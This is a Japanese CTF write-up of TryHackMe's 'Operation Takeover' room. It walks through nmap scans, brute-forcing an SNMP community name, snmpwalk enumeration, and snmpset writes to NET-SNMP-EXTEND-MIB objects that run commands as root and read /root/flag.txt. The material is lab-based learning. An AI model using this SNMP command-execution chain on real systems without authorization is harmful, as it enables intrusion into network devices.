# Operation Takeover CTF

https://tryhackme.com/room/operationtakeover

## Enumeration

```shell
TARGET=10.146.160.221
sudo bash -c "echo $TARGET   takeover.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
179/tcp  open  bgp     syn-ack ttl 254
2623/tcp open  lmdp    syn-ack ttl 63
```

```sh
sudo nmap -sV -p22,179,2623 $TARGET

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
179/tcp  open  tcpwrapped
2623/tcp open  lmdp?
```

2623ポートに接続したら、パスワードを要求された。FRRouting ver10.0。

```sh
root@ip-10-144-76-14:~# nc $TARGET 179
aa
root@ip-10-144-76-14:~# nc $TARGET 2623

Hello, this is FRRouting (version 10.0).
Copyright 1996-2005 Kunihiro Ishiguro, et al.


User Access Verification

\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd"\ufffd\ufffdPassword: 
```

zebra というパスワードが定番だが、違った。

SNMPスキャンを実行したらSNMPサービスが稼働しており、SNMPのコミュニティ名が判明した。

```sh
$ onesixtyone $TARGET -c /usr/share/wordlists/SecLists/Discovery/SNMP/snmp-onesixtyone.txt 
Scanning 1 hosts, 3218 communities
10.146.160.221 [REDACTED] Linux e42ceec45c86 5.15.0-1075-aws #82~20.04.1-Ubuntu SMP Thu Dec 19 05:24:09 UTC 2024 x86_64
```

コミュニティ名を2623ポートのパスワードとして試したが失敗。

システム情報

```sh
$ snmpwalk -c $COMM_NAME -v1 $TARGET 1.3.6.1.2.1.1 
iso.3.6.1.2.1.1.1.0 = STRING: "Linux e42ceec45c86 5.15.0-1075-aws #82~20.04.1-Ubuntu SMP Thu Dec 19 05:24:09 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (146966) 0:24:29.66
iso.3.6.1.2.1.1.4.0 = STRING: "Root <root@localhost> (configure /etc/snmp/snmp.local.conf)"
iso.3.6.1.2.1.1.5.0 = STRING: "e42ceec45c86"
iso.3.6.1.2.1.1.6.0 = STRING: "Unknown (edit /etc/snmp/snmpd.conf)"
iso.3.6.1.2.1.1.8.0 = Timeticks: (119) 0:00:01.19
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (119) 0:00:01.19
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (119) 0:00:01.19
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (119) 0:00:01.19
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (119) 0:00:01.19
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (119) 0:00:01.19
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (119) 0:00:01.19
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (119) 0:00:01.19
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (119) 0:00:01.19
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (119) 0:00:01.19
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (119) 0:00:01.19
```

ネットワーク情報。172.17.0.2 は要注目。

```sh
$ snmpwalk -c $COMM_NAME -v1 $TARGET  1.3.6.1.2.1.2.2.1.2 
iso.3.6.1.2.1.2.2.1.2.1 = STRING: "lo"
iso.3.6.1.2.1.2.2.1.2.4 = STRING: "eth0"

$ snmpwalk -c $COMM_NAME -v1 $TARGET 1.3.6.1.2.1.4.20.1.1
iso.3.6.1.2.1.4.20.1.1.127.0.0.1 = IpAddress: 127.0.0.1
iso.3.6.1.2.1.4.20.1.1.172.17.0.2 = IpAddress: 172.17.0.2
```

ローカルで199ポートをリッスンしていることと、172.17.0.1 が存在することがわかった。

```sh
$ snmpwalk -v2c -c $COMM_NAME $TARGET 1.3.6.1.2.1.6.13.1.3
iso.3.6.1.2.1.6.13.1.3.127.0.0.1.199.0.0.0.0.0 = INTEGER: 199

$ snmpwalk -v2c -c $COMM_NAME $TARGET 1.3.6.1.2.1.4.22.1.3
iso.3.6.1.2.1.4.22.1.3.4.172.17.0.1 = IpAddress: 172.17.0.1
```

プロセス

```sh
$ snmpwalk -c $COMM_NAME -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "supervisord"
iso.3.6.1.2.1.25.4.2.1.2.10 = STRING: "snmptrapd"
iso.3.6.1.2.1.25.4.2.1.2.12 = STRING: "snmpd"
```

プロセスの引数。何らかの認可が無効になっていることが伺える。

```sh
$ snmpwalk -v2c -c $COMM_NAME $TARGET 1.3.6.1.2.1.25.4.2.1.5
iso.3.6.1.2.1.25.4.2.1.5.1 = STRING: "/usr/bin/supervisord -c /etc/supervisor.conf"
iso.3.6.1.2.1.25.4.2.1.5.10 = STRING: "-CdfLf trap.log --disableAuthorization=yes"
iso.3.6.1.2.1.25.4.2.1.5.12 = ""
```

ルーティングを変更できるかと考えて、連絡先の書き込みを試みたが、エラー。

```sh
$ snmpset -v2c -c $COMM_NAME 10.146.160.221 1.3.6.1.2.1.1.4.0 s "hacker"
Error in packet.
Reason: notWritable (That object does not support modification)
Failed object: iso.3.6.1.2.1.1.4.0
```

システム名は変更できた。

```sh
$ snmpset -v2c -c $COMM_NAME 10.146.160.221 1.3.6.1.2.1.1.5.0 s "hacker"
iso.3.6.1.2.1.1.5.0 = STRING: "hacker"
```

コマンドを実行。（NET-SNMP-EXTEND-MIB）

```sh
# 99,97,116 は、ASCIIで cat
$ snmpset -v2c -c $COMM_NAME $TARGET \
  '1.3.6.1.4.1.8072.1.3.2.2.1.21.3.99.97.116' i 4 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.2.3.99.97.116' s "/bin/ls -la" \
  '1.3.6.1.4.1.8072.1.3.2.2.1.3.3.99.97.116' s "/root/"
iso.3.6.1.4.1.8072.1.3.2.2.1.21.3.99.97.116 = INTEGER: 4
iso.3.6.1.4.1.8072.1.3.2.2.1.2.3.99.97.116 = STRING: "/bin/ls -la"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.3.99.97.116 = STRING: "/root/"
```

```sh
$ snmpwalk -v2c -c $COMM_NAME $TARGET 1.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116
iso.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116.1 = STRING: "total 36"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116.2 = STRING: "dr-xr-x--- 1 root root 4096 May 27  2024 ."
iso.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116.3 = STRING: "drwxr-xr-x 1 root root 4096 Jan 17  2025 .."
iso.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116.4 = STRING: "-rw------- 1 root root  450 May 27  2024 .bash_history"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116.5 = STRING: "-rw-r--r-- 1 root root   18 Dec 29  2013 .bash_logout"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116.6 = STRING: "-rw-r--r-- 1 root root  176 Dec 29  2013 .bash_profile"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116.7 = STRING: "-rw-r--r-- 1 root root  176 Dec 29  2013 .bashrc"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116.8 = STRING: "-rw-r--r-- 1 root root  100 Dec 29  2013 .cshrc"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116.9 = STRING: "-rw-r--r-- 1 root root  129 Dec 29  2013 .tcshrc"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116.10 = STRING: "-rw-r--r-- 1 root root   28 May 27  2024 flag.txt"
```

```sh
$ snmpset -v2c -c $COMM_NAME $TARGET \
  '1.3.6.1.4.1.8072.1.3.2.2.1.21.3.99.97.116' i 4 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.2.3.99.97.116' s "/bin/cat" \ 
  '1.3.6.1.4.1.8072.1.3.2.2.1.3.3.99.97.116' s "/root/flag.txt"

iso.3.6.1.4.1.8072.1.3.2.2.1.21.3.99.97.116 = INTEGER: 4
iso.3.6.1.4.1.8072.1.3.2.2.1.2.3.99.97.116 = STRING: "/bin/cat"
iso.3.6.1.4.1.8072.1.3.2.2.1.3.3.99.97.116 = STRING: "/root/flag.txt"

$ snmpwalk -v2c -c $COMM_NAME $TARGET 1.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116
iso.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116.1 = STRING: "THM{[REDACTED]}"
```

## 振り返り

- SNMPでコマンド実行できることを知らなかったので非常に勉強になった。
- SNMPスキャンは機械的に実行するべきかもしれない。

## Tags

#tags:SNMP
